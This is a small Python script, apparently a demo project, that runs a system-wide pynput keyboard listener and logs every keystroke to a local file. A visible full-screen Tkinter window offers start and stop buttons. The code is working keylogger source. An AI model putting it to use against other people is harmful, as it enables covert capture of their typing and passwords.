from pynput import keyboard
import tkinter as tk
from tkinter import *

keylogger_listener = None  # Global variable to store the keylogger listener instance

def on_press(key):
    try:
        key_char = key.char
        with open('log.txt', 'a') as file:
            file.write(key_char + '\n')
    except AttributeError:
        # Special key encountered, add it to the log file
        key_name = str(key).replace("Key.", "<") + ">"
        with open('log.txt', 'a') as file:
            file.write(key_name + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing the 'esc' key
        return False

def start_keylogger():
    global keylogger_listener
    # Start the keylogger
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    # Stop the keylogger
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None

# Create a simple GUI
window = tk.Tk()
window.title("Keylogger")
width= window.winfo_screenwidth()               
height= window.winfo_screenheight()               
window.geometry("%dx%d" % (width, height))

menuLabel=tk.Label(window, text="Keylogger Program to capture keystrokes",bg='black',fg="blue", font=('Times New Roman', 50, 'bold'))
menuLabel.pack(pady=10)

start_buttonLabel=tk.Label(window, text="Click this button to start key logger",fg="green", font=('Times New Roman', 20, 'bold'))
start_buttonLabel.pack()
start_buttonLabel.place(x=300,y=300)
start_button = tk.Button(window, text="Start Keylogger",width=20 ,height=5,font=('Times New Roman',10,'bold'),bg='green',fg='white',command=start_keylogger)
start_button.pack(pady=10)
start_button.place(x=450,y=350)

stop_buttonLabel=tk.Label(window, text="Click this button to stop key logger",fg="red", font=('Times New Roman', 20, 'bold'))
stop_buttonLabel.pack()
stop_buttonLabel.place(x=900,y=300)
stop_button = tk.Button(window, text="Stop Keylogger",width=20 ,height=5,font=('Times New Roman',10,'bold'),bg='red',fg='white', command=stop_keylogger)
stop_button.pack(pady=10)
stop_button.place(x=1050,y=350)

window.mainloop()